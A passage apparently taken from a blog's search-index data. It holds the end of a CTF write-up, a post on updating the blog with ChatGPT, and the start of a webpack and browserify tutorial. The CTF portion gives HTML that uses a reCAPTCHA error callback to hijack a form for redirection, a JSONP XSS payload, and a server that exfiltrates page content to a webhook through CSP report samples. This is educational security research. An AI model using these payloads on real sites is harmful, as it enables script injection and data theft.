container.append(...notes.map(createNote)) &#125;) &#125; // submitting notes const titleEl = document.getElementById('title') const contentEl = document.getElementById('content') function trySubmit() &#123; const title = titleEl.value const content = contentEl.value if (title &amp;&amp; content) &#123; fetch('/api/notes', &#123; method: 'POST', headers: &#123; 'Content-Type': 'application/json' &#125;, body: JSON.stringify(&#123; title, content &#125;) &#125;) .then(r => r.json()) .then(r => &#123; if (r.status === 'ok') &#123; titleEl.value = '' contentEl.value = '' loadNotes() &#125; else &#123; alert(r.msg) &#125; &#125;) &#125; &#125; const addBtn = document.getElementById('add-btn') addBtn.addEventListener('click', trySubmit) // logout btn function logout() &#123; document.getElementById('logout-form').submit() &#125; const logoutBtn = document.getElementById('logout-btn') logoutBtn.addEventListener('click', logout) // share to admin btn function tokenCallback(token) &#123; fetch('/api/share', &#123; method: 'POST', headers: &#123; 'Content-Type': 'application/json' &#125;, body: JSON.stringify(&#123; token &#125;) &#125;) .then(r => r.json()) .then(r => &#123; if (r.status === 'ok') &#123; alert('Admin will view your note later!') &#125; else &#123; alert('Sorry, you need to pass recaptcha') &#125; &#125;) &#125; function share() &#123; grecaptcha.execute() &#125; const shareBtn = document.getElementById('share-btn') shareBtn.addEventListener('click', share) // init loadNotes() The only injection point is here: el.querySelector(&#39;.note-content&#39;).innerHTML = DOMPurify.sanitize(marked.parse(note.content)). However, because it has been passed through DOMPurify.sanitize, direct XSS is not possible. The CSP of this challenge is also quite strict: default-src &#39;self&#39;; script-src &#39;self&#39; https:&#x2F;&#x2F;www.google.com&#x2F;recaptcha&#x2F; https:&#x2F;&#x2F;www.gstatic.com&#x2F;recaptcha&#x2F;; frame-src https:&#x2F;&#x2F;www.google.com&#x2F;recaptcha&#x2F; https:&#x2F;&#x2F;www.gstatic.com&#x2F;recaptcha&#x2F;; Basically, script can only be imported by itself or reCAPATCHA, and there is no unsafe-inline available. Other things like style are also blocked, so it’s not CSS injection. I tried to find out if DOM clobbering could be used, but I couldn’t find any exploitable places. When I first saw this CSP, I thought that %2f could be used to bypass https://www.google.com/recaptcha/. For example, there is a google.com JSONP payload on JSONBee: &lt;script src=\"https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert#1\">&lt;/script> If you change the URL to https://www.google.com/recaptcha/..%2fcomplete/search?client=..., the browser will pass the CSP, and some servers will interpret ..%2f as ../, so it will be the endpoint we mentioned above. However, after trying it out, I found that this trick doesn’t work on Google and only returns a 404 not found, so it cannot be exploited. Anyway, I was stuck for an hour or two, and I couldn’t even figure out how to start. Later, the official solution gave two hints. The first hint was that in the first step, admin bot should be able to access your website, so there should be a redirect vulnerability on the note page. The second hint clearly indicated that the key to the first step was reCAPATCHA, and the answer could be found by carefully reading the documentation. From the documentation, it is not difficult to find an attribute that can be used: data-error-callback, which is described as: Optional. The name of your callback function, executed when reCAPTCHA encounters an error (usually network connectivity) and cannot continue until connectivity is restored. If you specify a function here, you are responsible for informing the user that they should retry. When reCAPTCHA fails to load, the function written in this attribute is called. The next step is to see which functions can be used in the code, and we found this: function logout() &#123; document.getElementById('logout-form').submit() &#125; The original position of the logout-form is below the position where the note is inserted, so we can use another form to cover it up. Because DOMPurify does not filter forms by default, nor does it filter attributes starting with data-, the following HTML can be used to redirect the webpage: &lt;form action=\"https://example.com\" id=\"logout-form\">&lt;/form> &lt;div class=\"g-recaptcha\" data-sitekey=\"A\" data-error-callback=\"logout\" data-size=\"invisible\">&lt;/div> The first stage is completed in this way, and the admin bot can be directed to any page. When I first saw the prompt, I got stuck here for a long time and couldn’t figure out what to do next. Looking at the solution, the second stage is the CRLF injection of setCookie, but because the injection point is below the CSP header, it is not possible to disable CSP, so even if you can control the response, theoretically it is not possible to XSS. This brings us to the exciting third stage. Before talking about the third stage, let me mention an unexpected solution that breaks the premise of “theoretically impossible to XSS”. The reason is that nim’s sqlite library will explode when the content contains \\0, and after the explosion, it will directly spit out an error message without a CSP header, resulting in a happy XSS. Back to the exciting third stage. The third stage is to use the Content-Security-Policy-Report-Only header to leak the flag. This is mainly because when the rules are violated, a JSON is sent to the server, which contains a script-sample. If an inline script violates the rules, the first 40 characters will be included (there is also a prerequisite that CSP must include report-sample). We can set up a simple server to verify: const express = require('express') const app = express() app.get('/abc', (req, res) => &#123; res.header('Content-Security-Policy', \"default-src 'self'; script-src 'self';\") res.header('Content-Security-Policy-Report-Only', \"script-src 'report-sample'; report-uri https://webhook.site/419d518f-922b-4e1e-8583-65596fae1c95\") res.send(` &lt;body> &lt;h1>hello&lt;/h1> &lt;script>flag&#123;test_flag&#125;&lt;/script> &lt;/body> `) res.end() &#125;) app.listen(3000, () => &#123; console.log('listening on http://localhost:3000') &#125;) From the browser, you can see what the sent request looks like: &#123; &quot;csp-report&quot;: &#123; &quot;document-uri&quot;: &quot;http:&#x2F;&#x2F;localhost:3000&#x2F;abc&quot;, &quot;referrer&quot;: &quot;&quot;, &quot;violated-directive&quot;: &quot;script-src-elem&quot;, &quot;effective-directive&quot;: &quot;script-src-elem&quot;, &quot;original-policy&quot;: &quot;script-src &#39;report-sample&#39;; report-uri https:&#x2F;&#x2F;webhook.site&#x2F;419d518f-922b-4e1e-8583-65596fae1c95&quot;, &quot;disposition&quot;: &quot;report&quot;, &quot;blocked-uri&quot;: &quot;inline&quot;, &quot;line-number&quot;: 4, &quot;source-file&quot;: &quot;http:&#x2F;&#x2F;localhost:3000&#x2F;abc&quot;, &quot;status-code&quot;: 200, &quot;script-sample&quot;: &quot;flag&#123;test_flag&#125;&quot; &#125; &#125; With this, the flag can be easily obtained and the work is done. Other PossibilitiesWhen writing this article, I thought about other possibilities at each stage, but under the strict conditions of the original question, the possible paths are very limited. However, if some changes are made to the original question and some restrictions are relaxed, there may be other possibilities. Open redirectThis is the only other solution I can think of under the condition that the original question remains unchanged. If you find an open redirect or JSONP for https://www.google.com/recaptcha/ or https://www.gstatic.com/recaptcha/, you can bypass CSP to execute JavaScript. CSS injectionIf CSP is relaxed, the script part is still blocked, but other style-related parts such as style-src, font-src, and img-src are not blocked, then there may be a chance to use CSS injection to slowly leak the flag.","link":"/2022/03/02/en/tsj-ctf-2022-nim-notes/"},{"title":"Updating Blog with chatGPT","text":"It’s been a long time since I made any major changes to my blog structure. Hexo has already released v6, and v7 is currently in beta, but my blog is still on hexo3. Recently, I had some free time and decided to update my blog, and also use chatGPT as a helper. The changes I made this time are: Upgraded Hexo version Modified syntax highlight Dark mode Automatic translation (highlight) Upgraded Hexo versionThe upgrade was smoother than I expected. I installed npm-upgrade following the tutorial I found online, and after running it, the upgrade was done. There wasn’t much to adjust after the upgrade. It was really smooth! Modified syntax highlightI used to use highlight.js, but I wanted to switch to another one for a long time because it doesn’t support JSX. After upgrading, I found that Hexo has built-in support for another one called Prism.js, so I switched to it. I just needed to modify the configuration file and manually add the style, which was quite simple. The only trouble was that some classes conflicted with other libraries, so I had to adjust them manually. Dark mode I used Bulma CSS library for my theme, but it doesn’t support dark mode, so I had to create one myself. The way I did it was quite simple. I first found the color of every word and background on the page and replaced them with CSS variables. Finally, I added some simple JavaScript to complete it. The CSS part looks like this: :root &#123; --main-text-color: #4a4a4a; --main-bg-color: white; --main-border-color: #dbdbdb; --title-text-color: #363636; --link-text-color: #3273dc; --link-hover-text-color: #363636; --code-bg-color: whitesmoke; --code-text-color: #ff3860; --tag-bg-color: whitesmoke; --tag-text-color: #363636; --quote-bg-color: whitesmoke; --nav-link-text-color: darkgray; --notice-bg-color: #ffe4c4; --archive-time-color: #888; --archive-hover-border-color: black; &#125; body.dark-mode &#123; --main-text-color: #f8f8f8; --main-bg-color: #061320; --main-border-color: #dbdbdb; --title-text-color: #fafafa; --link-text-color: #27ebda; --link-hover-text-color: #98fff6; --code-bg-color: #324b7e; --code-text-color: #f7f7f7; --tag-bg-color: whitesmoke; --tag-text-color: #363636; --quote-bg-color: #49495e; --nav-link-text-color: #b4b5b4; --notice-bg-color: #257800; --archive-time-color: #ddd; --archive-hover-border-color: #51ce97; &#125; And the JavaScript looks like this: if (localStorage.getItem('dark-mode')) &#123; if (localStorage.getItem('dark-mode') === 'true') &#123; document.body.classList.add('dark-mode') &#125; &#125; else &#123; if (window.matchMedia &amp;&amp; window.matchMedia('(prefers-color-scheme: dark)').matches) &#123; document.body.classList.add('dark-mode') &#125; &#125; It took me about half a day to modify and test it, and then it was done. I also solved the problem of CSS size and used this service to remove unused CSS: https://purifycss.online/ Although there may still be some residual or mistakenly deleted CSS, remember to check it again after using it. Automatic translationThe highlight of this update is the automatic translation feature, which relies heavily on chatGPT. The most important part of the translation is done by markdown-gpt-translator, which automatically divides the text into paragraphs and calls the API, and then assembles the results. Another great thing is that code blocks are not uploaded, so it saves a lot of tokens, but be aware that comments in code blocks need to be translated manually. After verifying that this translation library can be used, I started to modify it and integrate it with the automatic translation feature I wanted. And because the TypeScript environment setup is a bit tricky, I used this tool to convert it directly to JavaScript: https://transform.tools/typescript-to-javascript To automatically translate all the old articles, I followed these steps: List all the files of the articles Check if the translated version exists If it doesn’t exist, call the translation API and write it to the file I tell chatGPT to help me write some utility functions, and I adjusted and supplemented the details and the structure. For my own articles, it takes about a minute to translate one, and the price is about 0.02 to 0.04 dollars. After translating more than 100 articles, it cost me less than 3 dollars, which I think is quite cheap. However, there are still many places that need to be manually adjusted. I put the code and things to note here: https://github.com/aszx87410/huli-blog/tree/master/apps/translator Actually, after the translation was completed, I wanted to review them one by one, but I found it too time-consuming, so I left it for later. Updating Open Graph ImageI previously wrote a small function to generate a preview image, but many articles didn’t use this function before. This time, I used chatGPT to help me write a small program that can quickly convert them. I slightly modified the previous code, scanned all the old articles, automatically generated the missing ones, and added the correct path. Unfinished featuresFinally, a note on the unfinished features that will be more convenient to work on in the future: Update sitemap Check English article links Check English article content Modify comment system Modify multilingual RSS Automatically compress images.","link":"/2023/06/20/en/update-blog-with-chatgpt/"},{"title":"Introduction to webpack and snowpack for beginners","text":"IntroductionIn my blog, there are actually few tool-related tutorial articles. One reason is that these tool-related articles are all similar, and the other reason is that I am lazy and many step-by-step tutorials require detailed descriptions and rich screenshots, which is not suitable for me. But this time I decided to write this topic because I think webpack is a tool that beginners are not easy to understand, and even if they understand it, they may not really understand it. In other words, it is a tool that is often misunderstood. This is not a problem with webpack itself, but many beginners now start with React or Vue directly in front-end development, and they all use the CLI tools provided by them. When they need to customize some settings, they will notice: “Oh, there is a thing called webpack.” CLI tools bring convenience, and the advantage is that beginners can quickly get started without worrying about those cumbersome settings; the disadvantage is that if beginners are not aware of the tools behind them, when the tools are broken, cannot be used, or need to be modified somewhere, it will be the beginning of a nightmare. In order to reduce this situation, I decided to write this article, hoping to introduce everyone to the concept of webpack and modularity from the source. You must first know what a module is to understand what webpack is. At the beginning, I want to let everyone think about their familiarity with modularity and webpack through a few questions: Why do many projects (such as React) need to be built before deployment? What is this step doing? Do you know the difference between require/module.exports and import/export? Do you know that these two syntaxes of import and export cannot be used casually on the browser? Do you know why to use webpack? Do you know why webpack needs a loader? These questions should inspire you a little bit while reading this article, and I will answer them for you at the end. ModularityI believe everyone should have heard of the term module. This is a simple example. For example, your mobile phone, if the screen is broken, you can only replace the screen, if the camera is broken, you can only replace the camera, and if the battery is broken, you can only replace the battery. You may say, “Oh, what about it?” Have you ever thought about why you can replace it like this? Because the screen and the camera are two completely independent functions, they do not interfere with each other and have no dependencies, so replacing the screen will not break the camera function, and vice versa. This is actually the concept of modularity. The screen is a module that is only responsible for displaying information, and the camera is another module that is responsible for taking pictures. Through the software of the mobile phone, the screen and the camera are integrated to display the picture captured by the camera on the screen. If there is no concept of modularity, the entire mobile phone is really a whole, and each function is bound to each other. If the camera is broken, you have to replace the entire mobile phone, and you cannot replace only the camera. If we talk about code, it will probably look like this: import 相機 import 螢幕 import AA電池 import sim卡 Phone.start(相機, 螢幕, AA電池, sim卡) One of the benefits of modularity is convenience. If you want to use someone else’s battery today, just change the battery part, and other parts don’t need to be changed: import 相機 import 螢幕 import BB 電池 import sim卡 Phone.start(相機, 螢幕, BB 電池, sim卡) When writing code, it is also like this. We often use many built-in modules or modules written by others. Taking Node.js as an example, you can use the built-in os module to obtain operating system-related information, such as which platform the operating system is: var os = require('os') console.log(os.platform()) // darwin Here we use require to import the built-in os module and call os.platform() to get information. This is the most basic use of modules in the program. After understanding this concept, we can narrow the scope and talk about how modularity works in Node.js. (I think it is important to have a basic understanding of Node.js to understand the concept of modularity. If you don’t know anything about it, it is highly recommended to learn a little bit, at least know what it is doing.) Node.js ModulesIt has been mentioned before that we can use require in Node.js to import built-in modules. What if we want to make a module ourselves? Use the module.exports syntax. For example, we have a utils.js, which contains a frequently used function calculate for calculating prices: // utils.js function calculate(n) &#123; return ((n * 100 + 20 - 4)) % 10 + 3 // 計算價格公式 &#125; module.exports = calculate // 把這個函式 export 出去 Then we can use the require syntax in another file main.js to import: // main.js var calculate = require('./utils') console.log(calculate(30)) // 9 What we module.exports in utils.js will be imported with require(&#39;./utils&#39;) elsewhere. So you can think of var calculate = require(&#39;./utils&#39;) as var calculate = (module.exports in utils.js). Let’s take another example where we change the output of utils.js to an object: function calculate(n) &#123; return ((n * 100 + 20 - 4)) % 10 + 3 // 計算價格公式 &#125; module.exports = &#123; cal: calculate, name: 'hello' &#125; // 把這個物件 export 出去 In main.js, we can still get this object in the same way: var obj = require('./utils') console.log(obj.cal(30)) // 9 console.log(obj.name) // hello This is the basic concept of module usage in Node.js, using module.exports to export things and require to import modules. This module mechanism is not actually part of the JavaScript specification, but rather a standard called “CommonJS”. Some people may be confused by this. Let’s imagine a scenario. Before the emergence of ES6, JavaScript itself did not specify any mechanism related to modules. At this time, everyone can come up with their own ideas. For example, A may think it’s better to write it like this: // utils.js function calculate(n) &#123; return ((n * 100 + 20 - 4)) % 10 + 3 // 計算價格公式 &#125; out = &#123; cal: calculate, name: 'hello' &#125; // main.js var obj = include('./utils') console.log(obj.cal(30)) // 9 console.log(obj.name) // hello Use out to output modules and include to import them. And B may say it’s better like this: // utils.js function calculate(n) &#123; return ((n * 100 + 20 - 4)) % 10 + 3 // 計算價格公式 &#125; EXP = &#123; cal: calculate, name: 'hello' &#125; // main.js var obj = in('./utils') console.log(obj.cal(30)) // 9 console.log(obj.name) // hello Use EXP to output modules and in to import them. So A’s standard is called A standard, and B’s is called B standard. Both of these standards can achieve modularity, but the syntax and implementation behind them are different. CommonJS is just one of these standards, which uses module.exports to export modules and require to import them. Later, Node.js adopted this CommonJS standard, which is why we see this form now. Have you noticed that we have been talking about Node.js all the time? What about browsers? Sorry, browsers do not natively support this. So you can’t use module.exports or require in the browser. Some people may say, “You’re lying! Why can my company’s project use these and still run in the browser?” Well, I’m not lying. It’s true that browsers don’t natively support it, but you can use other tools to achieve this (yes, you now know why you need to use webpack). But before introducing the tools, let’s try to solve this problem ourselves. Manually adding CommonJS supportIn the CommonJS module standard, the two most important things are: module.exports require As mentioned earlier: Whatever we export in utils.js, we can import it with require(&#39;./utils&#39;). So you can think of var calculate = require(&#39;./utils&#39;) as var calculate = (what is exported in utils.js) module.exports. Therefore, we can try to add some code to make require(&#39;./utils.js) return what is exported in utils.js, and we’re done. First, wrap the original content of main.js in a function called main and pass in require: function main(require) &#123; var obj = require('./utils') console.log(obj.cal(30)) // 9 console.log(obj.name) // hello &#125; Then wrap the content of utils.js in a function, and since utils.js does not use require, we change it to pass in a parameter called module, like this: function main(require) &#123; var obj = require('./utils') console.log(obj.cal(30)) console.log(obj.name) &#125; function utils(module) &#123; function calculate(n) &#123; return ((n * 100 + 20 - 4)) % 10 + 3 &#125; module.exports = &#123; cal: calculate, name: 'hello' &#125; &#125; The above just wraps the two files with two functions and passes in parameters. Next, we can declare a variable m outside and pass it into utils, then call it: function main(require) &#123; var obj = require('./utils') console.log(obj.cal(30)) console.log(obj.name) &#125; function utils(module) &#123; function calculate(n) &#123; return ((n * 100 + 20 - 4)) % 10 + 3 &#125; module.exports = &#123; cal: calculate, name: 'hello' &#125; &#125; // 加入這兩行 var m = &#123;&#125; utils(m) After calling the utils function, m.exports will be what we exported in the utils function, which should be returned when require(&#39;utils.js&#39;) is called in main. So the final step is to call the main function and pass in a require parameter: function main(require) &#123; var obj = require('./utils') console.log(obj.cal(30)) console.log(obj.name) &#125; function utils(module) &#123; function calculate(n) &#123; return ((n * 100 + 20 - 4)) % 10 + 3 &#125; module.exports = &#123; cal: calculate, name: 'hello' &#125; &#125; var m = &#123;&#125; utils(m) // 加入底下這幾行 function r() &#123; // 回傳我們所需要的 m.exports return m.exports &#125; main(r) That’s it! We can now pass module.exports from utils to main and return it when require(&#39;utils.js&#39;) is called. You can copy and paste the entire code above into the browser, and it should run smoothly! The above code is just a rough demonstration of the principle. The basic principle is: Wrap the file into a function and receive parameters such as module and require. Call the function outside and pass in an object and the require function. However, in reality, it is not that simple because there are still many problems to solve, such as: Dependency, for example, A depends on B, and B depends on C, so the loading order must be: C-&gt;B-&gt;A. Loading multiple modules, the function we passed to main only returns the module.exports of utils, but it should support multiple requires, so what to return should be determined based on the parameter in require. Caching, when a module is loaded multiple times, it should be cached. After understanding the principle, let’s see how to use existing tools. Introduction to BrowserifyThe world of front-end development is simple, in a nutshell: If something is not supported, write a tool to support it. Babel, webpack, and PostCSS are all tools that implement functions that are not natively supported by browsers. In 2011, browserify was introduced. The first sentence on its official website describes its purpose: Browserify lets you require(‘modules’) in the browser by bundling up all of your dependencies. In short, it allows you to use require in the browser. You can use the following command in the terminal to package the two files main.js and utils.js we just created: npx browserify main.js -o bundle.js The first parameter passed in is the so-called entry point, which represents the main file to be executed. For example, when we demonstrated earlier, we used node main.js to execute, which means that the file to be executed is actually main.js, so main.js is the entry point. Then the generated bundle.js content is as follows: ( function e(t, n, r) &#123; function s(o, u) &#123; if (!n[o]) &#123; if (!t[o]) &#123; var a = typeof require == \"function\" &amp;&amp; require; if (!u &amp;&amp; a) return a(o, !0); if (i) return i(o, !0); var f = new Error(\"Cannot find module '\" + o + \"'\"); throw f.code = \"MODULE_NOT_FOUND\", f &#125; var l = n[o] = &#123; exports: &#123;&#125; &#125;; t[o][0].call(l.exports, function(e) &#123; var n = t[o][1][e]; return s(n ? n : e) &#125;, l, l.exports, e, t, n, r) &#125; return n[o].exports &#125; var i = typeof require == \"function\" &amp;&amp; require; for (var o = 0; o &lt; r.length; o++) s(r[o]); return s &#125;)(&#123; 1: [function(require, module, exports) &#123; function calculate(n) &#123; return ((n * 100 + 20 - 4)) % 10 + 3 // 計算價格公式 &#125; module.exports = &#123; cal: calculate, name: 'hello' &#125; // 把這個物件 export 出去 &#125;, &#123;&#125;], 2: [function(require, module, exports) &#123; var obj = require('./utils') console.log(obj.cal(30)) // 9 console.log(obj.name) // hello &#125;, &#123; \"./utils\": 1 &#125;] &#125;, &#123;&#125;, [2]); It is normal if you cannot understand it because this is the compressed version. But the core concept is: “Wrap your code in a function and provide a function called require and an object called module for you to use.” It is similar to what we did above, but more rigorous. If you really want to understand what is going on, I refer to the source code: browser-pack&#x2F;prelude.js, and restore the packaged code and add comments. For readability, I also changed the order and removed some additional checks and functions. The result is as follows (please note that for teaching purposes, only the most core functions are left below, and the rest of the code is removed): // 跟我們做的事情一樣，把檔案包成一個 function，傳入 require, modules function utils(require, module) &#123; function calculate(n) &#123; return ((n * 100 + 20 - 4)) % 10 + 3 &#125; module.exports = &#123; cal: calculate, name: 'hello' &#125; &#125; // 跟我們做的事情一樣，把檔案包成一個 function，傳入 require, modules function main(require, module) &#123; var obj = require('./utils') console.log(obj.cal(30)) console.log(obj.name) &#125; /* 定義一個叫做 modules 的物件，裡面把 module 換成數字編號 陣列的第一個參數就是上面包好的 function，第二個參數則是相依性需要的 module 以及編號 例如說： &#123; \"./utils\": 1 &#125; 代表說當我呼叫 require(\"./utils\") 的時候，其實就是要載入編號為 1 的 module */ var modules = &#123; 1: [utils, &#123;&#125;], 2: [main, &#123; \"./utils\": 1 &#125;] &#125; /* 函式詳細內容可以見底下，第一個參數就是 modules 第二個參數是 cache（先不管） 第三個參數則是入口點，就像是 C 語言裡面的 main function 那樣 以我們的範例來說，就是 main.js 這個檔案，也就是編號為 2 的 module */ outer(modules, &#123;&#125;, [2]) /* 底下程式碼來自：https://github.com/browserify/browser-pack/blob/master/prelude.js 為了方便理解核心功能，有經過刪改 */ function outer(modules, cache, entry) &#123; /* 順序執行 entry，在我們的例子 entry 只有一個 所以可以簡單想成是：newRequire(2) */ for (var i = 0; i &lt; entry.length; i++) &#123; newRequire(entry[i]); &#125; /* 核心程式碼在下面 以我們的例子而言，name 會是 2 */ function newRequire(name) &#123; //先從 cache 裡面找這個 module 的內容，找不到的話載入 module 並且放入 cache if (!cache[name]) &#123; // 找不到要載入的 module，拋出錯誤 if (!modules[name]) &#123; var err = new Error('Cannot find module \\'' + name + '\\''); err.code = 'MODULE_NOT_FOUND'; throw err; &#125; /* 宣告一個物件來儲存 module export 出來的東西 並且一併放到 cache 裡面 */ var m = cache[name] = &#123; exports:&#123;&#125; &#125;; /* 核心功能就是底下這四行 呼叫我們最前面定義的那個包好的 function，並且傳入 require 以及 module 在 require 裡面會根據 modules 的內容找到要引入的 id 以 require('./utils') 為例 modules[2][1]['./utils'] 是 1，就會去載入 id 為 1 的 module 並且回傳 */ modules[name][0].call(m.exports, function(x)&#123; var id = modules[name][1][x]; // 載入 module 並且回傳 return newRequire(id ? id : x); &#125;, m); &#125; // 找到的話就直接回傳 module.exports return cache[name].exports &#125; &#125; The original code is more complicated because it needs to consider many other situations, and only the core module function is left, which looks like the one above. It’s okay if you don’t understand it, after all, this is a more beginner-friendly article, just take a quick look. You only need to know one key point: CommonJS (require and module.exports) is not natively supported by browsers, and tools must be used to use them in browsers. The “tool” mentioned above, we have introduced browserify, but there is another more famous one. Yes, it’s webpack! Exploring WebpackWhen we used browserify just now, we used this command to specify the entry point and the name of the packaged file: npx browserify main.js -o bundle.js Webpack is essentially similar to browserify, but these need to be turned into configuration files. We can add a webpack.config.js: module.exports &#x3D; &#123; entry: &#39;.&#x2F;main.js&#39;, output: &#123; path: __dirname, filename: &#39;webpack_bundle.js&#39; &#125; &#125; Careful observation will reveal that this is actually the same as the options that need to be set when using browserify, the entry point, the output file name, and the path (__dirname represents the same directory as the config file). Then execute these few commands in the terminal, which is basically to install webpack and then execute webpack: npm init -y npm install webpack webpack-cli --save-dev npx webpack --config webpack.config.js Then you will see a webpack_bundle.js in the directory, and the content is also something that cannot be understood at all. This is because webpack has two modes, production and development, and the default is the former. Production means that it will automatically compress and optimize for use in production environments. During development, the development mode is usually used, and the packaging speed is faster. The way to change it is very simple, just change the configuration file: module.exports = &#123; mode: 'development', entry: './main.js', output: &#123; path: __dirname, filename: 'webpack_bundle.js' &#125; &#125; After saving, execute npx webpack --config webpack.config.js again, and the result is as follows: /******/ (function(modules) &#123; // webpackBootstrap /******/ // The module cache /******/ var installedModules = &#123;&#125;; /******/ /******/ // The require function /******/ function __webpack_require__(moduleId) &#123; /******/ /******/ // Check if module is in cache /******/ if(installedModules[moduleId]) &#123; /******/ return installedModules[moduleId].exports; /******/ &#125; /******/ // Create a new module (and put it into the cache) /******/ var module = installedModules[moduleId] = &#123; /******/ i: moduleId, /******/ l: false, /******/ exports: &#123;&#125; /******/ &#125;; /******/ /******/ // Execute the module function /******/ modules[moduleId].call(module.exports, module, module.exports, __webpack_require__); /******/ /******/ // Flag the module as loaded /******/ module.l = true; /******/ /******/ // Return the exports of the module /******/ return module.exports; /******/ &#125; /******/ /******/ /******/ // expose the modules object (__webpack_modules__) /******/ __webpack_require__.m = modules; /******/ /******/ // expose the module cache /******/ __webpack_require__.c = installedModules; /******/ /******/ // define getter function for harmony exports /******/ __webpack_require__.d = function(exports, name, getter) &#123; /******/ if(!__webpack_require__.o(exports, name)) &#123; /******/ Object.defineProperty(exports, name, &#123; enumerable: true, get: getter &#125;); /******/ &#125; /******/ &#125;; /******/ /******/ // define __esModule on exports /******/ __webpack_require__.r = function(exports) &#123; /******/ if(typeof Symbol !== 'undefined' &amp;&amp; Symbol.toStringTag) &#123; /******/ Object.defineProperty(exports, Symbol.toStringTag, &#123; value: 'Module' &#125;); /******/ &#125; /******/ Object.defineProperty(exports, '__esModule', &#123; value: true &#125;); /******/ &#125;; /******/ /******/ // create a fake namespace object /******/ // mode &amp; 1: value is a module id, require it /******/ // mode &amp; 2: merge all properties of value into the ns /******/ // mode &amp; 4: return value when already ns object /******/ // mode &amp; 8|1: behave like require /******/ __webpack_require__.t = function(value, mode) &#123; /******/ if(mode &amp; 1) value = __webpack_require__(value); /******/ if(mode &amp; 8) return value; /******/ if((mode &amp; 4) &amp;&amp; typeof value === 'object' &amp;&amp; value &amp;&amp; value.__esModule) return value; /******/ var ns = Object.create(null); /******/ __webpack_require__.r(ns); /******/ Object.defineProperty(ns, 'default', &#123; enumerable: true, value: value &#125;); /******/ if(mode &amp; 2 &amp;&amp; typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) &#123; return value[key]; &#125;.bind(null, key)); /******/ return ns; /******/ &#125;; /******/ /******/ // getDefaultExport function for compatibility with non-harmony modules /******/ __webpack_require__.n = function(module) &#123; /******/ var getter = module &amp;&amp; module.__esModule ? /******/ function getDefault() &#123; return module['default']; &#125; : /******/ function getModuleExports() &#123; return module; &#125;; /******/ __webpack_require__.d(getter, 'a', getter); /******/ return getter; /******/ &#125;; /******/ /******/ // Object.prototype.hasOwnProperty.call /******/ __webpack_require__.o = function(object, property) &#123; return Object.prototype.hasOwnProperty.call(object, property); &#125;; /******/ /******/ // __webpack_public_path__ /******/ __webpack_require__.p = \"\"; /******/ /******/ /******/ // Load entry module and return exports /******/ return __webpack_require__(__webpack_require__.s = \"./main.js\"); /******/ &#125;) /************************************************************************/ /******/ (&#123; /***/ \"./main.js\": /*!*****************!*\\ !*** ./main.js ***! \\*****************/ /*! no static exports found */ /***/ (function(module, exports, __webpack_require__) &#123; eval(\"var obj = __webpack_require__(/*! ./utils */ \\\"./utils.js\\\")\\nconsole.log(obj.cal(30)) // 9\\nconsole.log(obj.name) // hello\\n\\n\\n//# sourceURL=webpack:///./main.js?\"); /***/ &#125;), /***/ \"./utils.js\": /*!******************!*\\ !*** ./utils.js ***! \\******************/ /*! no static exports found */ /***/ (function(module, exports) &#123; eval(\"function calculate(n) &#123; \\n return ((n * 100 + 20 - 4)) % 10 + 3 // 計算價格公式\\n&#125;\\n \\nmodule.exports = &#123;\\n cal: calculate,\\n name: 'hello'\\n&#125; // 把這個物件 export 出去\\n\\n//# sourceURL=webpack:///./utils.js?\"); /***/ &#125;) /******/ &#125;); Like browserify, you can paste the entire string above into the browser console and execute it normally to output the result. Although you don’t need to look closely at the code above, you will notice that many things are similar to the code packaged by browserify. Okay, I believe everyone has learned two key points here: webpack is similar to browserify To use the CommonJS module mechanism on the browser, you must use a tool to package the code first. And the second point is the reason why webpack is necessary. At this point, you may have a question: But our company doesn’t use require, we use ES6’s import and export, isn’t the browser already supporting it? Then why do we need webpack? That’s a good question. Take a break and get a drink of water, the second half is about to begin. Standardization of ES6 modulesAs mentioned earlier, before ES6 appeared, JavaScript did not have a standard module specification. Node.js supports CommonJS, so you can use require and module.exports, but the browser does not natively support it, so tools like browserify and webpack are needed. After ES6 came out, there was finally a formal specification, which is the import and export that we often see. We can change the previous main.js and utils.js to the form of import and export: // main.js import obj from './utils' console.log(obj.cal(30)) console.log(obj.name) //utils.js function calculate(n) &#123; return ((n * 100 + 20 - 4)) % 10 + 3 // 計算價格公式 &#125; export default &#123; cal: calculate, name: 'hello' &#125; Although this is the ES6 standard, the support is not very good. If you try to execute node main.js on Node.js, it will give you a SyntaxError: Unexpected identifier error directly because Node.js does not recognize the import syntax. There are two ways to use import and export on Node.js. The first method is to change the file extension from .js to .mjs, and then add a flag when using node: node --experimental-modules main.mjs. By the way, this is the situation when the Node.js version is less than 13. If it is the latest version 13 or above, just change the file name to mjs. For details, please refer to: Node.js v13.7.0 Documentation: ECMAScript Modules. The second method is the famous babel, which relies on babel to convert ES6 syntax to ES5, and can be used directly on the simple online converter provided by babel. Convert the content of main.js from import to require: The above is about Node.js. What about the browser? You can try not to change anything first, just main.js and utils.js, and then add an index.html, the content is as follows: &lt;html> &lt;head> &lt;script src=\"./main.js\">&lt;/script> &lt;/head> &lt;body> &lt;/body> &lt;/html> After opening it, you will see that the devtool console spits out such an error: Uncaught SyntaxError: Cannot use import statement outside a module Similar to Node.js, if you want to use import and export, you must execute it in the form of a module, so you need to add a type to the script tag: &lt;html> &lt;head> &lt;script src=\"./main.js\" type=\"module\">&lt;/script> &lt;/head> &lt;body> &lt;/body> &lt;/html> Then, when you reopen the page, you will find another error: Access to script at &#39;file:&#x2F;&#x2F;&#x2F;Users&#x2F;huli&#x2F;w_test&#x2F;main.js&#39; from origin &#39;null&#39; has been blocked by CORS policy: Cross origin requests are only supported for protocol schemes: http, data, chrome, chrome-extension, https. Currently, I am opening index.html by double-clicking it, so it is just opening the file, and the URL will start with file:///. If you want to use import, you must open it in a server. You can enter this command in the same directory to run a file server: python -m SimpleHTTPServer 8080 Then you can open it: http://localhost:8080. Unfortunately, another error occurred this time: GET http://localhost:8080/utils net::ERR_ABORTED 404 (File not found) You need to change import obj from &#39;./utils&#39; in main.js to import obj from &#39;./utils.js&#39; to explicitly specify that you want to import the .js file. After changing it, refresh the page, and you can see the correct result on the console! Below is the complete code, with only three files: main.js import obj from './utils.js' console.log(obj.cal(30)) console.log(obj.name) utils.js function calculate(n) &#123; return ((n * 100 + 20 - 4)) % 10 + 3 // 計算價格公式 &#125; export default &#123; cal: calculate, name: 'hello' &#125; index.html &lt;html> &lt;head> &lt;script src=\"./main.js\" type=\"module\">&lt;/script> &lt;/head> &lt;body> &lt;/body> &lt;/html> So far, everything seems to be going smoothly, and there doesn’t seem 